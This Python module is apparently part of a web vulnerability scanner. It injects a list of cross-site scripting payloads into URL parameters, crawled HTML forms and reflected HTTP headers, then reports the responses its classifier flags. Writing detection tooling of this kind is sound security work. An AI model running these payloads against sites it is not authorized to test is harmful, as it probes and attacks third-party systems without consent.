import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlencode, urlparse, parse_qs
from config import DEFAULT_TIMEOUT
from modules.vuln.waf_aware_classifier import classify

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    '"><img src=x onerror=alert(1)>',
    "<body onload=alert(1)>",
    "<script>alert('xss')</script>",
    '"><svg/onload=alert(1)>',
    "';alert(1)//",
]

# Lightweight markers to detect partial reflection without full payload
_MARKERS = ["optisecxss49", "xsstestopti"]


def _scan_url_params(session: requests.Session, url: str) -> list:
    """Test XSS via URL query parameters."""
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        params = {"q": ["test"], "search": ["test"], "id": ["1"], "input": ["test"]}

    for param in params:
        for payload in XSS_PAYLOADS:
            test_params = {k: v[0] for k, v in params.items()}
            test_params[param] = payload
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"
            try:
                r = session.get(test_url, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
                result = classify(r.status_code, r.headers, r.text, payload)
                if result.verdict == "ENDPOINT_INVALID":
                    break  # path itself is unreachable, no point trying more payloads
                if result.should_report:
                    findings.append({
                        "type": "XSS",
                        "severity": result.severity,
                        "url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": f"{result.reason} (HTTP {r.status_code})",
                        "waf_detected": result.waf_detected,
                        "verdict": result.verdict,
                    })
                    break
            except Exception:
                continue
    return findings


def _scan_forms(session: requests.Session, base_url: str) -> list:
    """Crawl page, find HTML forms, and test XSS via POST/GET form submission."""
    findings = []
    try:
        r = session.get(base_url, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
        soup = BeautifulSoup(r.text, "html.parser")
    except Exception:
        return findings

    forms = soup.find_all("form")[:5]  # limit to 5 forms
    for form in forms:
        action = form.get("action", "")
        method = form.get("method", "get").lower()
        form_url = urljoin(base_url, action) if action else base_url

        # Collect all text/search/email inputs
        inputs = {}
        for inp in form.find_all(["input", "textarea"]):
            name = inp.get("name", "")
            if not name:
                continue
            itype = inp.get("type", "text").lower()
            if itype in ("text", "search", "email", "url", "tel", "textarea", "hidden", ""):
                inputs[name] = inp.get("value", "test")

        if not inputs:
            continue

        for param in inputs:
            for payload in XSS_PAYLOADS[:5]:  # fewer payloads for form scanning
                test_data = dict(inputs)
                test_data[param] = payload
                try:
                    if method == "post":
                        resp = session.post(form_url, data=test_data, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
                    else:
                        resp = session.get(form_url, params=test_data, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
                    result = classify(resp.status_code, resp.headers, resp.text, payload)
                    if result.verdict == "ENDPOINT_INVALID":
                        break
                    if result.should_report:
                        findings.append({
                            "type": "XSS",
                            "severity": result.severity,
                            "url": form_url,
                            "parameter": param,
                            "payload": payload,
                            "evidence": f"{result.reason} via {method.upper()} form submission (HTTP {resp.status_code})",
                            "waf_detected": result.waf_detected,
                            "verdict": result.verdict,
                        })
                        break
                except Exception:
                    continue

    return findings


def _scan_headers(session: requests.Session, url: str) -> list:
    """Test XSS via HTTP headers that may be reflected (User-Agent, Referer, X-Forwarded-For)."""
    findings = []
    payload = "<script>alert(1)</script>"
    headers_to_test = {
        "User-Agent": payload,
        "Referer": f"{url}?x={payload}",
        "X-Forwarded-For": payload,
    }
    for header, value in headers_to_test.items():
        try:
            r = session.get(url, headers={header: value}, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
            result = classify(r.status_code, r.headers, r.text, payload)
            if result.should_report:
                findings.append({
                    "type": "XSS",
                    "severity": result.severity,
                    "url": url,
                    "parameter": header,
                    "payload": payload,
                    "evidence": f"{result.reason} from {header} header (HTTP {r.status_code})",
                    "waf_detected": result.waf_detected,
                    "verdict": result.verdict,
                })
        except Exception:
            continue
    return findings


def scan_xss(url: str) -> list:
    session = requests.Session()
    session.headers["User-Agent"] = "OPTISEC-ReconPro/1.0 (Security Testing)"

    findings = []
    seen_params = set()

    for f in _scan_url_params(session, url):
        key = (f["url"], f["parameter"])
        if key not in seen_params:
            seen_params.add(key)
            findings.append(f)

    for f in _scan_forms(session, url):
        key = (f["url"], f["parameter"])
        if key not in seen_params:
            seen_params.add(key)
            findings.append(f)

    for f in _scan_headers(session, url):
        key = (f["url"], f["parameter"])
        if key not in seen_params:
            seen_params.add(key)
            findings.append(f)

    return findings
